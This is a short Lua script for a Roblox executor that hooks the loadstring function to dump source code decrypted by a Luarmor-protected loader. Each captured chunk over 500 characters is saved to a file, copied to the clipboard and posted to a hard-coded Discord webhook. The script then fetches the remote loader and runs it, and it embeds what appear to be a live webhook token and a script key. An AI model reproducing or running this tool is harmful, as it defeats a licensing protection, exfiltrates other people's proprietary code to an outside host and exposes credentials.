--[[
  CAPTURE LUARMOR SOURCE → Discord webhook + file + clipboard
  LDPlayer/mobile: run in executor; if webhook fails, use saved file or paste from clipboard.
]]

local SCRIPT_KEY = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local LOADER_URL = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjhIAdJGY9xJGDffQuH37d3kdy9DOPTcYycCW9Cd1J-6lYafDFFDP6-K"

local captureCount = 0
local oldLoadstring = loadstring

local function sendToWebhook(content, useEmbed)
	if type(content) ~= "string" or #content == 0 then return end
	pcall(function()
		local payload
		if useEmbed and #content > 500 then
			local desc = "```lua\n" .. content:sub(1, 3900) .. (#content > 3900 and "\n...(truncated)" or "") .. "\n```"
			payload = { content = "**Luarmor capture #" .. captureCount .. "** (" .. #content .. " chars)", embeds = { { title = "Source", description = desc } } }
		else
			payload = { content = content:sub(1, 1990) }
		end
		local body
		if game and game:GetService then
			body = game:GetService("HttpService"):JSONEncode(payload)
			game:GetService("HttpService"):PostAsync(WEBHOOK_URL, body)
		elseif type(request) == "function" then
			local esc = function(s) return ("%q"):format(tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")) end
			if payload.embeds and payload.embeds[1] then
				local e = payload.embeds[1]
				body = "{\"content\":" .. esc(payload.content) .. ",\"embeds\":[{\"title\":" .. esc(e.title) .. ",\"description\":" .. esc(e.description or "") .. "}]}"
			else
				body = "{\"content\":" .. esc(payload.content) .. "}"
			end
			request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		end
	end)
end

loadstring = function(source, chunkname)
	if type(source) == "string" and #source > 500 then
		captureCount = captureCount + 1
		pcall(function()
			if writefile then
				writefile("luarmor_captured_" .. captureCount .. ".lua", source)
			end
		end)
		pcall(function()
			if setclipboard then setclipboard(source) end
		end)
		print("[CAPTURE] #" .. captureCount .. " (" .. #source .. " chars) – webhook + file. If no Discord, check executor folder or paste from clipboard.")
		sendToWebhook(source, true)
	end
	return oldLoadstring(source, chunkname)
end

-- Now run the loader (same as your script)
script_key = SCRIPT_KEY
loadstring(game:HttpGet(LOADER_URL))()
